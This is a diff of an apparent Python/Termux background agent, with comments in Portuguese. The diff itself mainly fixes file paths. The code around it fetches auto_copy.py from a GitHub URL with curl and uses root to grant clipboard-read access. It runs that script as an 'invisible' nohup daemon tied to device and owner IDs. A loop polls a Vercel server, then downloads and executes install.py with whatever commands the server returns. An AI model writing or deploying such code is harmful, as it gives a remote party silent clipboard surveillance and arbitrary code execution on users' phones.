@@ -18,7 +18,11 @@ except ImportError:
     os.system("pip install gdown --upgrade -q > /dev/null 2>&1")
     import gdown
 
-CONFIG_FILE = "hapie_config.json"
+# Pega o diretório base para evitar erros de pasta não encontrada
+BASE_DIR = os.path.dirname(os.path.abspath(__file__)) if '__file__' in globals() else os.getcwd()
+CONFIG_FILE = os.path.join(BASE_DIR, "hapie_config.json")
+FUNCTIONS_DIR = os.path.join(BASE_DIR, "functions")
+
 saved_config = {}
 
 if os.path.exists(CONFIG_FILE):
@@ -116,9 +120,14 @@ def atualizar_client_token(novo_token):
     if novo_token and novo_token != client_token:
         client_token = novo_token
         try:
-            with open(CONFIG_FILE, "r") as f:
-                config = json.load(f)
+            config = {}
+            # Verifica se o arquivo existe antes de tentar ler (Evita o Errno 2)
+            if os.path.exists(CONFIG_FILE):
+                with open(CONFIG_FILE, "r") as f:
+                    config = json.load(f)
             config["client_token"] = client_token
+            
+            # Salva o arquivo forçadamente
             with open(CONFIG_FILE, "w") as f:
                 json.dump(config, f)
             print("🔑 [AUTH] Nova licença de segurança instalada no aparelho.")
@@ -128,26 +137,30 @@ def atualizar_client_token(novo_token):
 print("🚀 Starting background services (Auto-Copy)...")
 try:
     os.system("pkill -f auto_copy.py > /dev/null 2>&1")
-    os.system("rm -rf functions/auto_copy.py > /dev/null 2>&1")
     
-    os.makedirs("functions", exist_ok=True)
+    # Cria a pasta via sistema operacional (Evita o Errno 2)
+    os.system(f"mkdir -p {FUNCTIONS_DIR}")
+    
+    copy_script_path = os.path.join(FUNCTIONS_DIR, "auto_copy.py")
+    log_script_path = os.path.join(FUNCTIONS_DIR, "copy_log.txt")
+    
+    os.system(f"rm -rf {copy_script_path} > /dev/null 2>&1")
+    
     v_cache = int(time.time())
     URL_COPY_PY = f"https://raw.githubusercontent.com/Willianz4z4/Hapiephonee/main/functions/auto_copy.py?v={v_cache}"
-    os.system(f"curl -sL '{URL_COPY_PY}' -o functions/auto_copy.py > /dev/null 2>&1")
+    os.system(f"curl -sL '{URL_COPY_PY}' -o {copy_script_path} > /dev/null 2>&1")
     
     caminho_python = sys.executable
-    caminho_script = os.path.abspath("functions/auto_copy.py")
-    
     subprocess.run('su -c "appops set com.termux READ_CLIPBOARD allow" 2>/dev/null', shell=True)
     
-    comando_daemon = f"nohup {caminho_python} {caminho_script} {device_id} {guild_id} {owner_id} > functions/copy_log.txt 2>&1 &"
+    comando_daemon = f"nohup {caminho_python} {copy_script_path} {device_id} {guild_id} {owner_id} > {log_script_path} 2>&1 &"
     os.system(comando_daemon)
     print(f"✅ Invisible module deployed successfully! (Logs at functions/copy_log.txt)")
 except Exception as e:
     print(f"⚠️ Error deploying module: {e}")
 
 registrado_no_banco = False
-INTERVALO_PING = 15
+INTERVALO_PING = 15 # Deixei 15 segundos para ser rápido!
 ultima_checagem = 0 
 
 def obter_ultima_atividade():
@@ -180,7 +193,6 @@ while True:
             if response.status_code == 200:
                 resposta_json = response.json()
                 
-                # --- PRINT DE DEBUG: MOSTRA O QUE O VERCEL MANDOU ---
                 print(f"📦 Resposta recebida do Vercel: {resposta_json}")
                 
                 if "new_client_token" in resposta_json:
@@ -197,26 +209,22 @@ while True:
                     
                 ultima_checagem = time.time() 
 
-                # --- ⚙️ MOTOR DE INSTALAÇÃO INJETADO AQUI ---
                 if "instalar" in resposta_json or "comandos" in resposta_json:
-                    os.makedirs("functions", exist_ok=True)
+                    os.system(f"mkdir -p {FUNCTIONS_DIR}")
+                    install_script_path = os.path.join(FUNCTIONS_DIR, "install.py")
                     
-                    # Verifica se o script de instalação existe, se não, baixa na hora (SEM SILENCIAR)
-                    if not os.path.exists("functions/install.py"):
+                    if not os.path.exists(install_script_path):
                         print("📥 Baixando Install Engine (functions/install.py)...")
                         v_cache_install = int(time.time())
                         URL_INSTALL = f"https://raw.githubusercontent.com/Willianz4z4/Hapiephonee/main/functions/install.py?v={v_cache_install}"
-                        os.system(f"curl -sL '{URL_INSTALL}' -o functions/install.py") 
-                        # Removido o > /dev/null para ver se o curl dá erro 404
+                        os.system(f"curl -sL '{URL_INSTALL}' -o {install_script_path}") 
 
-                    # Converte as ordens para string JSON e roda o script filho (SEM SILENCIAR)
                     tasks_str = json.dumps(resposta_json)
                     try:
                         print("⚡ Acionando functions/install.py...")
-                        # check=True faz o script avisar se o install.py der erro (crashar)
-                        subprocess.run([sys.executable, "functions/install.py", tasks_str], check=True)
+                        subprocess.run([sys.executable, install_script_path, tasks_str], check=True)
                     except subprocess.CalledProcessError as err:
-                        print(f"❌ O install.py falhou ao rodar (Crash). Código de erro: {err.returncode}")
+                        print(f"❌ O install.py falhou ao rodar. Código de erro: {err.returncode}")
                     except Exception as err:
                         print(f"❌ Falha inesperada ao tentar chamar o script: {err}")
 
